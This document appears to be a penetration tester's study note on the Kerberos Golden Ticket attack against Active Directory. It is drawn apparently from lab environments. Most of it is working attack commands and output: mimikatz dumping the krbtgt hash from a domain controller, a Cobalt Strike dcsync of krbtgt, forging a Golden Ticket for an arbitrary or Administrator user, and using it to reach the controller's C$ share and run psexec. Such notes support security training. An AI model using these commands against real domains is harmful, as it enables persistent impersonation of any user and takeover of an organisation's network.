---
creation date: September 26th 2022
last modified date: September 26th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Golden Ticket]]  
___

## Description:  

Need krbtgt password hash, which usually requires domain admin to obtain.

A Golden Ticket is a forged TGT, signed by the domain's krbtgt account. Whereas a Silver Ticket can be used to impersonate any user, it's limited to either that single service or to any service but on a single machine. A Golden Ticket can be used to impersonate any user, to any service, on any machine in the domain; and to add insult to injury - the underlying credentials are never changed automatically. For that reason, the `krbtgt` NTLM/AES is probably the single most powerful secret you can obtain (and is why you see it used in dcsync examples so frequently).

### In mimikatz
Dump hashes on the domain controller and look for krbtgt password hash.
```
mimikatz # lsadump::lsa /patch
...
RID : 000001f6 (502)
User : krbtgt
LM :
NTLM : 75b60230a2394a812000dbfad8415965
...
```
Now make the Golden ticket
```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt

mimikatz # misc::cmd

C:\Users\offsec.crop> psexec.exe \\dc01 cmd.exe

```

### In CobaltStrike

```
beacon> dcsync dev.cyberbotic.io DEV\krbtgt

[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 2/19/2021 1:31:57 PM
Object Security ID   : S-1-5-21-3263068140-2042698922-2891547269-502
Object Relative ID   : 502

[...snip...]

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa
      aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822
      des_cbc_md5       (4096) : b9fefed6da865732
```

Now make the golden ticket
```
mimikatz # kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /ticket:golden.kirbi
User      : Administrator
Domain    : dev.cyberbotic.io (DEV)
SID       : S-1-5-21-3263068140-2042698922-2891547269
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa - aes256_hmac
Lifetime  : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM
-> Ticket : golden.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

To use it:

```
beacon> make_token DEV\Administrator FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\golden.kirbi
beacon> ls \\dc-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     05/18/2021 10:23:49   fe1c92f2af2eb37e7af4463c8a4ea7
          dir     02/23/2018 11:06:05   PerfLogs
          dir     05/06/2021 09:40:04   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     05/17/2021 13:22:43   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/25/2021 10:23:35   Shares
          dir     02/19/2021 11:49:20   System Volume Information
          dir     03/25/2021 10:27:55   Users
          dir     05/17/2021 18:55:39   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 850mb    fil     05/25/2021 08:52:07   pagefile.sys

beacon> rev2self
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 26th 2022 (12:54 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
